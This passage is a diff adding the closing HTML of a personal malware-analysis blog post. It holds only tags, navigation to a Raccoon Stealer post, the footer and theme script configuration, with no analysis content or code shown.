Loader, extracting the final payload and network traffic analysis"><i class="fab fa-trello fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/malware-analysis/">Malware Analysis</a>,&nbsp;<a href="/tags/reverse-engineering/">Reverse Engineering</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/raccoon-stealer/" class="prev" rel="prev" title="Raccoon Stealer"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Raccoon Stealer</a></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.102.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Mohamed Adel</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/valine@1.5.0/dist/Valine.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{"valine":{"appId":"QGzwQXOqs5JOhN4RGPOkR2mR-MdYXbMMI","appKey":"WBmoGyJtbqUswvfLh6L8iEBr","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@14.0.0/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"en","pageSize":10,"placeholder":"Your comment ...","recordIP":true,"serverURLs":"https://leancloud.hugoloveit.com","visitor":true}},"lightgallery":true,"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
